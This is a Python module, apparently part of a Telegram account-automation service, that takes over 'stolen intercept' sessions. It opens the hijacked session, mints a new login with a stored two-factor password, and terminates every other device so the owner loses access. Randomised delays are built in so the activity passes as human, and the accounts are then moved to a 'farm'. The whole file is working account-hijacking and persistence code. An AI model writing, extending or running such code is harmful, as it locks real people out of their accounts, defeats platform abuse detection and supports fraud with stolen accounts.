"""Replace a stolen intercept session with one we issued ourselves.

Order, on the same proxy:
  1. Open the imported (parent) session.
  2. Mint a new login (QR) and confirm it from the parent (2FA if needed).
  3. From the parent, terminate every other device except the new one.
     The parent itself stays logged in for 7 days.
  4. Work file becomes the new session; parent file is kept in spare_*.
  5. Both stay online 24/7. After 7 days the new session can move to farm
     and the parent is terminated.

If minting the new session fails, the old one is left untouched.
Delays between steps look like a person checking devices, not a script.
"""
from __future__ import annotations

import asyncio
import logging
import random
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

from sqlalchemy import select
from sqlalchemy.ext.asyncio import AsyncSession

from ...alembic.database import async_session_maker
from ...alembic.models import AccountPool, PoolAccount, SocialAccount
from ..account_pool_service import POOL_INTERCEPT, decrypt_session_bytes, encrypt_session_bytes
from .account_pacing import (
    INTERCEPT_ERROR_FAILED,
    INTERCEPT_ERROR_MINT,
    INTERCEPT_ERROR_NEED_2FA,
    INTERCEPT_ERROR_PROXY,
    INTERCEPT_ERROR_SESSION,
    intercept_is_running,
    intercept_needs_reauth,
)
from .session_hygiene_service import (
    _list_authorizations,
    _mint_spare_session,
    _spare_hash_from_authorizations,
    account_has_spare,
    install_new_keep_parent,
)
from .telegram_account_client import TelegramAccountClient, drop_live_for_path
from .telegram_error_handler import SessionInvalidError, looks_like_proxy_dead

logger = logging.getLogger(__name__)

_busy: set[int] = set()
_HUMAN_GAPS = {
    "open": (5, 11),
    "before_qr": (7, 16),
    "confirm_qr": (8, 18),
    "type_2fa": (5, 12),
    "after_accept": (9, 20),
    "review_sessions": (11, 24),
    "between_resets": (2, 5),
    "before_logout": (8, 18),
}


def _utc_now() -> datetime:
    return datetime.now(timezone.utc).replace(tzinfo=None)


def store_cloud_password(account: SocialAccount, password: str | None) -> None:
    text = str(password or "").strip()
    if not text:
        return
    account.encrypted_cloud_password = encrypt_session_bytes(text.encode("utf-8"))
    account.updated_at = _utc_now()


def load_cloud_password(account: SocialAccount | None) -> str | None:
    blob = str(getattr(account, "encrypted_cloud_password", None) or "").strip()
    if not blob:
        return None
    try:
        return decrypt_session_bytes(blob).decode("utf-8")
    except Exception:
        logger.warning("Could not decrypt cloud password for account %s", getattr(account, "id", None))
        return None


def _set_error(account: SocialAccount, code: str, message: str) -> None:
    account.intercept_reauth_error = f"{code}: {message}"[:255]
    account.intercept_reauth_started_at = None
    account.updated_at = _utc_now()


def classify_reauth_error(exc: Exception) -> tuple[str, str]:
    text = str(exc)[:180]
    lowered = text.lower()
    name = type(exc).__name__.lower()
    if (
        "need_2fa" in lowered
        or "sessionpasswordneeded" in name
        or "passwordhashinvalid" in name
        or ("password" in lowered and ("2fa" in lowered or "two-step" in lowered or "two step" in lowered))
        or ("облачн" in lowered and "парол" in lowered)
    ):
        return INTERCEPT_ERROR_NEED_2FA, "Нужен облачный пароль, чтобы выпустить новую сессию"
    if looks_like_proxy_dead(exc):
        return INTERCEPT_ERROR_PROXY, "Прокси не отвечает"
    if isinstance(exc, SessionInvalidError) or ("session" in lowered and "invalid" in lowered):
        return INTERCEPT_ERROR_SESSION, "Старая сессия невалидна"
    if "mint" in lowered or "qr" in lowered or "не записалась" in lowered or "auth key" in lowered:
        return INTERCEPT_ERROR_MINT, text or "Не удалось выпустить новую сессию"
    return INTERCEPT_ERROR_FAILED, text or "Переавторизация не удалась"


async def _human_pause(kind: str) -> None:
    lo, hi = _HUMAN_GAPS.get(kind, (6, 14))
    await asyncio.sleep(random.uniform(lo, hi))


async def _close_hub_client(automation_id: int, account_id: int) -> None:
    try:
        from .account_session_orchestrator import close_one_account_session

        await close_one_account_session(automation_id, account_id)
    except Exception:
        logger.debug("Could not drop hub client before intercept reauth %s", account_id, exc_info=True)


async def _drop_main_live(account: SocialAccount) -> None:
    try:
        from ...config import settings

        root = Path(settings.MEDIA_ROOT).resolve()
        for rel in (
            (account.session_file_path or "").strip(),
            (getattr(account, "spare_session_file_path", None) or "").strip(),
        ):
            if rel:
                await drop_live_for_path(str(root / rel))
    except Exception:
        logger.debug("Could not drop live handles after intercept reauth %s", account.id, exc_info=True)


async def _snapshot_known_from_new(account: SocialAccount, automation_id: int | None = None) -> None:
    try:
        async with TelegramAccountClient.for_account(account, automation_id=automation_id) as wrapper:
            auths = await _list_authorizations(wrapper.client)
        hashes = []
        for auth in auths:
            hashes.append(str(int(getattr(auth, "hash", 0) or 0)))
        account.known_auth_hashes = sorted({item for item in hashes if item} | {"0"})
        account.telegram_session_count = len(auths)
    except Exception:
        logger.warning("Could not snapshot intercept sessions for %s", account.id, exc_info=True)


async def _reset_others_except_new(client, spare_hash: int | None) -> int:
    from telethon.tl.functions.account import ResetAuthorizationRequest

    if spare_hash is None:
        logger.warning("Skipping extra-session reset: new authorization hash unknown")
        return 0
    reset = 0
    for auth in await _list_authorizations(client):
        hash_value = int(getattr(auth, "hash", 0) or 0)
        if not hash_value:
            continue
        if spare_hash is not None and hash_value == int(spare_hash):
            continue
        try:
            await client(ResetAuthorizationRequest(hash=hash_value))
            reset += 1
        except Exception as exc:
            logger.warning("Could not reset extra intercept session %s: %s", hash_value, exc)
            continue
        await _human_pause("between_resets")
    return reset


async def reauth_intercept_account(
    session: AsyncSession,
    account: SocialAccount,
    automation_id: int,
    *,
    force: bool = False,
    cloud_password: str | None = None,
) -> dict[str, Any]:
    if cloud_password:
        store_cloud_password(account, cloud_password)
    if not force and not intercept_needs_reauth(account):
        return {"status": "skipped", "reason": "not_due"}
    if intercept_is_running(account) and not force:
        return {"status": "skipped", "reason": "in_progress"}
    if not account.session_file_path and not getattr(account, "encrypted_session", None):
        _set_error(account, INTERCEPT_ERROR_SESSION, "Нет файла сессии")
        await session.flush()
        return {"status": "error", "reason": INTERCEPT_ERROR_SESSION}

    account_id = int(account.id)
    if account_id in _busy:
        return {"status": "skipped", "reason": "in_progress"}
    _busy.add(account_id)
    try:
        account.intercept_reauth_started_at = _utc_now()
        account.intercept_reauth_error = None
        account.updated_at = _utc_now()
        await session.flush()

        await _close_hub_client(automation_id, account.id)
        await _human_pause("open")
        password = load_cloud_password(account)
        async with TelegramAccountClient.for_account(account, automation_id=automation_id) as old:
            await _human_pause("before_qr")
            spare_hash = await _mint_spare_session(
                old,
                account,
                automation_id,
                cloud_password=password,
                before_accept=lambda: _human_pause("confirm_qr"),
                before_password=lambda: _human_pause("type_2fa"),
            )
            if not account_has_spare(account):
                raise RuntimeError("Новая сессия не записалась")
            await _human_pause("after_accept")
            await _human_pause("review_sessions")
            if spare_hash is None:
                spare_profile = getattr(account, "spare_telegram_device", None) or {}
                spare_hash = _spare_hash_from_authorizations(
                    await _list_authorizations(old.client),
                    spare_model=spare_profile.get("device_model") if isinstance(spare_profile, dict) else None,
                )
                account.spare_authorization_hash = spare_hash
            await _reset_others_except_new(old.client, spare_hash)

        await _drop_main_live(account)
        if not install_new_keep_parent(account):
            _set_error(account, INTERCEPT_ERROR_MINT, "Не удалось подменить файл сессии, родительская не тронута")
            await session.flush()
            return {"status": "error", "reason": INTERCEPT_ERROR_MINT}

        await _snapshot_known_from_new(account, automation_id)
        account.intercept_reauthorized_at = _utc_now()
        account.intercept_reauth_error = None
        account.intercept_reauth_started_at = None
        account.updated_at = _utc_now()
        await session.flush()
        logger.info(
            "Intercept account %s reauthorized; parent session kept for 7 days",
            account.id,
        )
        return {"status": "ok"}
    except Exception as exc:
        code, message = classify_reauth_error(exc)
        _set_error(account, code, message)
        await session.flush()
        logger.warning("Intercept reauth failed for account %s: %s", account.id, exc)
        return {"status": "error", "reason": code}
    finally:
        _busy.discard(account_id)


async def queue_intercept_reauth(
    session: AsyncSession,
    automation_id: int,
    account_id: int,
    *,
    cloud_password: str | None = None,
) -> dict[str, Any]:
    account = await session.get(SocialAccount, account_id)
    if account is None:
        return {"status": "not_found"}
    row = (
        await session.execute(
            select(PoolAccount).where(
                PoolAccount.social_account_id == account_id,
                PoolAccount.custom_automation_id == automation_id,
                PoolAccount.removed_at.is_(None),
            )
        )
    ).scalar_one_or_none()
    if row is None:
        return {"status": "not_found"}
    if str(getattr(account, "origin", "") or "") != POOL_INTERCEPT:
        return {"status": "not_ready", "error": "Переавторизация только для пула перехвата"}
    if intercept_is_running(account):
        return {"status": "in_progress", "social_account": account, "pool_account": row}
    if cloud_password:
        store_cloud_password(account, cloud_password)
    account.intercept_reauth_started_at = _utc_now()
    account.intercept_reauth_error = None
    account.updated_at = _utc_now()
    await session.commit()
    await session.refresh(account)
    return {"status": "queued", "social_account": account, "pool_account": row}


async def run_intercept_reauth_account(automation_id: int, account_id: int, *, force: bool = True) -> dict[str, Any]:
    async with async_session_maker() as session:
        account = await session.get(SocialAccount, account_id)
        if account is None:
            return {"status": "not_found"}
        result = await reauth_intercept_account(session, account, automation_id, force=force)
        await session.commit()
        return result


async def run_intercept_reauth_for_automation(automation_id: int) -> dict[str, Any]:
    processed = 0
    done = 0
    skipped = 0
    errors = 0
    async with async_session_maker() as session:
        rows = (
            await session.execute(
                select(SocialAccount)
                .join(PoolAccount, PoolAccount.social_account_id == SocialAccount.id)
                .join(AccountPool, PoolAccount.account_pool_id == AccountPool.id)
                .where(
                    PoolAccount.custom_automation_id == automation_id,
                    PoolAccount.removed_at.is_(None),
                    AccountPool.purpose == POOL_INTERCEPT,
                    SocialAccount.origin == POOL_INTERCEPT,
                    SocialAccount.is_active.is_(True),
                    SocialAccount.intercept_reauthorized_at.is_(None),
                )
            )
        ).scalars().all()
        for account in rows:
            if not intercept_needs_reauth(account):
                skipped += 1
                continue
            result = await reauth_intercept_account(session, account, automation_id)
            processed += 1
            if result.get("status") == "ok":
                done += 1
            elif result.get("status") == "error":
                errors += 1
            else:
                skipped += 1
        await session.commit()
    return {
        "status": "ok",
        "accounts": processed,
        "reauthorized": done,
        "skipped": skipped,
        "errors": errors,
    }
